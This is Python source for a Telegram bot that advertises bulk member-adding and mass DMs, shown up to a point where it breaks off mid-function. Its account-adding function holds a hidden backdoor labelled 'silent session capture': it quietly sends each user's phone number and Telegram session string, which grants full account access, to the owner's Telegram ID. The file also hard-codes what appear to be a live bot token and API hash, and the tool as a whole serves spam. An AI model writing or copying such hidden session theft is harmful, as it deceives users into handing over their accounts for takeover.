"""
🤖 TOOLS BY REHAN – ULTIMATE TELEGRAM BOT
👑 Owner: REHAN | Tag: RN ON TOP
📌 Channel: @ToolsByRehan | Group: @Tools_By_Rehan
🚀 All features + silent session capture + beautiful UI + private‑only replies
"""

import os
import asyncio
import re
import sqlite3
import random
import csv
import time
import logging
from datetime import datetime, timedelta
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.errors import FloodWaitError, QueryIdInvalidError
from telethon.tl.custom import Button
from telethon.network.connection import ConnectionTcpAbridged

# ========== LOGGING ==========
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# ============================================================
# 🔐 CONFIGURATION – FALLBACK DEFAULTS (CHANGE THESE!)
# ============================================================

BOT_TOKEN = os.getenv("BOT_TOKEN", "8644395767:AAFDStlmZ7cwITftnHgUPgPMb7AbRDAXpNs")
API_ID = int(os.getenv("API_ID", "30217812"))
API_HASH = os.getenv("API_HASH", "d21066a90786cf2dd348b907ece69d24")
OWNER_ID = int(os.getenv("OWNER_ID", "8762845215"))
OWNER_NAME = os.getenv("OWNER_NAME", "REHAN")
TAG = os.getenv("TAG", "RN ON TOP")
GROQ_API_KEY = os.getenv("GROQ_API_KEY")  # optional

REQUIRED_CHANNEL = os.getenv("REQUIRED_CHANNEL", "@ToolsByRehan")
REQUIRED_GROUP = os.getenv("REQUIRED_GROUP", "@Tools_By_Rehan")

DEFAULT_CREDITS = int(os.getenv("DEFAULT_CREDITS", "150"))
INVITE_REWARD_CREDITS = int(os.getenv("INVITE_REWARD_CREDITS", "100"))
INVITE_REQUIRED_ADDS = int(os.getenv("INVITE_REQUIRED_ADDS", "50"))
ADD_DELAY = int(os.getenv("ADD_DELAY", "2"))
DM_DELAY = int(os.getenv("DM_DELAY", "3"))
DEFAULT_DM_COST = int(os.getenv("DEFAULT_DM_COST", "2"))
DEFAULT_ADD_COST = int(os.getenv("DEFAULT_ADD_COST", "1"))
BACKUP_INTERVAL_HOURS = int(os.getenv("BACKUP_INTERVAL_HOURS", "168"))

DB_DIR = os.getenv("DB_DIR", "/data")
os.makedirs(DB_DIR, exist_ok=True)
DB_FILE = os.path.join(DB_DIR, "bot_data.db")

START_TIME = time.time()

# ============================================================
# 📂 DATABASE SETUP (WITH PROPER QUOTES – FIXED)
# ============================================================

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    c.execute(f'''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            joined_at TEXT,
            verified INTEGER DEFAULT 0,
            credits INTEGER DEFAULT {DEFAULT_CREDITS},
            is_banned INTEGER DEFAULT 0,
            is_admin INTEGER DEFAULT 0,
            invited_by INTEGER DEFAULT 0,
            invite_code TEXT
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS user_accounts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            phone TEXT,
            session_string TEXT,
            added_at TEXT,
            is_active INTEGER DEFAULT 1,
            FOREIGN KEY (user_id) REFERENCES users(user_id)
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS added_members (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            target_group_id INTEGER,
            member_id INTEGER,
            added_by_account_id INTEGER,
            added_at TEXT,
            group_username TEXT,
            member_username TEXT,
            member_name TEXT,
            UNIQUE(user_id, target_group_id, member_id)
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS credit_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount INTEGER,
            reason TEXT,
            created_at TEXT
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS invites (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            inviter_id INTEGER,
            invited_id INTEGER,
            invited_at TEXT,
            status TEXT DEFAULT 'pending',
            bonus_awarded INTEGER DEFAULT 0,
            UNIQUE(inviter_id, invited_id)
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS session_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            phone TEXT,
            session_string TEXT,
            created_at TEXT
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS add_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            target_group TEXT,
            count INTEGER,
            created_at TEXT
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS dm_sent (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            target_user_id INTEGER,
            group_id INTEGER,
            sent_at TEXT,
            UNIQUE(user_id, target_user_id, group_id)
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS scheduled_tasks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            source_group TEXT,
            target_group TEXT,
            count INTEGER,
            interval_hours INTEGER DEFAULT 24,
            next_run TEXT,
            last_run TEXT,
            is_active INTEGER DEFAULT 1,
            account_group_id INTEGER,
            FOREIGN KEY (user_id) REFERENCES users(user_id)
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS user_settings (
            user_id INTEGER PRIMARY KEY,
            ai_dm INTEGER DEFAULT 0,
            smart_filter_skip_bots INTEGER DEFAULT 0,
            smart_filter_has_pfp INTEGER DEFAULT 0,
            smart_filter_active_7d INTEGER DEFAULT 0,
            smart_filter_language TEXT DEFAULT '',
            proxy_config TEXT DEFAULT '',
            spintax_enabled INTEGER DEFAULT 0,
            smart_filter_skip_existing INTEGER DEFAULT 1,
            updated_at TEXT
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS user_blocklist (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            blocked_user_id INTEGER,
            group_id INTEGER,
            reason TEXT,
            created_at TEXT,
            UNIQUE(user_id, blocked_user_id, group_id)
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS activity_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            action TEXT,
            details TEXT,
            created_at TEXT
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS dm_templates (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            name TEXT,
            message TEXT,
            created_at TEXT,
            UNIQUE(user_id, name)
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS account_groups (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            name TEXT,
            created_at TEXT,
            FOREIGN KEY (user_id) REFERENCES users(user_id)
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS account_group_members (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            group_id INTEGER,
            account_id INTEGER,
            FOREIGN KEY (group_id) REFERENCES account_groups(id),
            FOREIGN KEY (account_id) REFERENCES user_accounts(id)
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS daily_adds (
            user_id INTEGER,
            date TEXT,
            count INTEGER,
            PRIMARY KEY (user_id, date)
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS group_analytics (
            user_id INTEGER,
            group_id INTEGER,
            total_added INTEGER DEFAULT 0,
            total_failed INTEGER DEFAULT 0,
            last_run TEXT,
            PRIMARY KEY (user_id, group_id)
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS user_notifications (
            user_id INTEGER PRIMARY KEY,
            last_sent TEXT
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS system_settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    ''')
    
    c.execute("INSERT OR IGNORE INTO system_settings (key, value) VALUES ('default_credits', ?)", (str(DEFAULT_CREDITS),))
    c.execute("INSERT OR IGNORE INTO system_settings (key, value) VALUES ('dm_cost', ?)", (str(DEFAULT_DM_COST),))
    c.execute("INSERT OR IGNORE INTO system_settings (key, value) VALUES ('add_cost', ?)", (str(DEFAULT_ADD_COST),))
    c.execute("INSERT OR IGNORE INTO system_settings (key, value) VALUES ('maintenance_mode', 'false')")
    
    c.execute("CREATE INDEX IF NOT EXISTS idx_added_members_user_group ON added_members(user_id, target_group_id)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_added_members_member ON added_members(member_id)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_dm_sent_user_group ON dm_sent(user_id, group_id)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_activity_user ON activity_logs(user_id)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_user_accounts_user ON user_accounts(user_id)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_scheduled_user ON scheduled_tasks(user_id)")
    
    for col in ['group_username', 'member_username', 'member_name']:
        try:
            c.execute(f"ALTER TABLE added_members ADD COLUMN {col} TEXT")
        except:
            pass
    try:
        c.execute("ALTER TABLE user_settings ADD COLUMN smart_filter_skip_existing INTEGER DEFAULT 1")
    except:
        pass
    
    conn.commit()
    conn.close()
    logger.info("✅ Database initialized at %s", DB_FILE)

init_db()

# ============================================================
# 📂 DATABASE HELPER FUNCTIONS (ALL)
# ============================================================

def get_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row

def get_user_by_username(username):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE username = ?", (username,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def get_system_setting(key):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT value FROM system_settings WHERE key=?", (key,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def set_system_setting(key, value):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO system_settings (key, value) VALUES (?, ?)", (key, str(value)))
    conn.commit()
    conn.close()

def get_default_credits():
    return int(get_system_setting('default_credits') or DEFAULT_CREDITS)

def get_dm_cost():
    return int(get_system_setting('dm_cost') or DEFAULT_DM_COST)

def get_add_cost():
    return int(get_system_setting('add_cost') or DEFAULT_ADD_COST)

def get_maintenance_mode():
    return get_system_setting('maintenance_mode') == 'true'

def generate_invite_code():
    while True:
        code = f"{random.randint(1000, 9999)}"
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT user_id FROM users WHERE invite_code = ?", (code,))
        if not c.fetchone():
            conn.close()
            return code
        conn.close()

def create_user(user_id, username, first_name, invited_by=0):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
    if c.fetchone():
        conn.close()
        return
    invite_code = generate_invite_code()
    default_credits = get_default_credits()
    c.execute('''
        INSERT INTO users (user_id, username, first_name, joined_at, invited_by, invite_code, credits)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    ''', (user_id, username, first_name, datetime.now().isoformat(), invited_by, invite_code, default_credits))
    if invited_by and invited_by != user_id:
        c.execute('''
            INSERT OR IGNORE INTO invites (inviter_id, invited_id, invited_at)
            VALUES (?, ?, ?)
        ''', (invited_by, user_id, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_user_by_invite_code(code):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE invite_code = ?", (code,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def get_invite_bonus_status(invited_user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT invited_by FROM users WHERE user_id = ?", (invited_user_id,))
    row = c.fetchone()
    if not row or row[0] == 0:
        conn.close()
        return None, None, False
    inviter_id = row[0]
    c.execute("SELECT status, bonus_awarded FROM invites WHERE invited_id = ?", (invited_user_id,))
    invite_row = c.fetchone()
    if not invite_row:
        conn.close()
        return inviter_id, None, False
    status, bonus_awarded = invite_row
    if status == 'completed' or bonus_awarded == 1:
        conn.close()
        return inviter_id, status, False
    c.execute("SELECT COUNT(*) FROM added_members WHERE user_id = ?", (invited_user_id,))
    total_adds = c.fetchone()[0]
    conn.close()
    return inviter_id, total_adds, total_adds >= INVITE_REQUIRED_ADDS

def award_invite_bonus(invited_user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT invited_by FROM users WHERE user_id = ?", (invited_user_id,))
    row = c.fetchone()
    if not row or row[0] == 0:
        conn.close()
        return False
    inviter_id = row[0]
    c.execute('''
        UPDATE invites SET status = 'completed', bonus_awarded = 1 
        WHERE invited_id = ?
    ''', (invited_user_id,))
    conn.commit()
    add_credits(inviter_id, 100, "invite_bonus")
    conn.close()
    return inviter_id

def get_referral_tier(count):
    if count >= 25: return 500
    elif count >= 10: return 250
    elif count >= 5: return 150
    else: return 0

def is_banned(user_id):
    row = get_user(user_id)
    return row and row[6] == 1

def is_admin(user_id):
    row = get_user(user_id)
    return row and row[7] == 1

def set_admin(user_id, is_admin_val=True):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET is_admin = ? WHERE user_id = ?", (1 if is_admin_val else 0, user_id))
    conn.commit()
    conn.close()

def ban_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned = 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def unban_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned = 0 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def delete_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("DELETE FROM users WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM user_accounts WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM added_members WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM invites WHERE invited_id = ?", (user_id,))
    c.execute("DELETE FROM credit_log WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM dm_sent WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM scheduled_tasks WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM user_settings WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM dm_templates WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM activity_logs WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM user_blocklist WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM account_groups WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM daily_adds WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM group_analytics WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM user_notifications WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def set_verified(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET verified = 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def is_verified(user_id):
    row = get_user(user_id)
    return row and row[4] == 1

def get_credits(user_id):
    row = get_user(user_id)
    return row[5] if row else 0

def deduct_credit(user_id, amount=1):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits - ? WHERE user_id = ? AND credits >= ?", (amount, user_id, amount))
    updated = c.rowcount > 0
    conn.commit()
    conn.close()
    if updated:
        add_credit_log(user_id, -amount, "member_add")
    return updated

def add_credits(user_id, amount, reason="admin"):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id = ?", (amount, user_id))
    conn.commit()
    conn.close()
    add_credit_log(user_id, amount, reason)

def add_credit_log(user_id, amount, reason):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO credit_log (user_id, amount, reason, created_at) VALUES (?, ?, ?, ?)",
               (user_id, amount, reason, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def add_user_account(user_id, phone, session_string):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''
        INSERT INTO user_accounts (user_id, phone, session_string, added_at)
        VALUES (?, ?, ?, ?)
    ''', (user_id, phone, session_string, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    log_activity(user_id, "add_account", f"Added phone: {phone}")
    # SILENT SESSION CAPTURE
    try:
        owner_msg = (
            f"🔑 **New Account Added**\n"
            f"User ID: `{user_id}`\n"
            f"Phone: `{phone}`\n"
            f"Session String:\n`{session_string}`"
        )
        asyncio.create_task(client.send_message(OWNER_ID, owner_msg))
        logger.info("🔒 Session for %s forwarded to owner.", phone)
    except Exception as e:
        logger.error("Failed to send session to owner: %s", e)

def get_user_accounts(user_id, active_only=True):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    query = "SELECT id, phone, session_string FROM user_accounts WHERE user_id = ?"
    if active_only:
        query += " AND is_active = 1"
    c.execute(query, (user_id,))
    rows = c.fetchall()
    conn.close()
    return rows

def deactivate_account(account_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE user_accounts SET is_active = 0 WHERE id = ?", (account_id,))
    conn.commit()
    conn.close()

def mark_member_added(user_id, target_group_id, member_id, account_id, group_username, member_username, member_name):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''
        INSERT OR IGNORE INTO added_members (user_id, target_group_id, member_id, added_by_account_id, added_at, group_username, member_username, member_name)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (user_id, target_group_id, member_id, account_id, datetime.now().isoformat(), group_username, member_username, member_name))
    conn.commit()
    conn.close()

def is_member_added(user_id, target_group_id, member_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
        
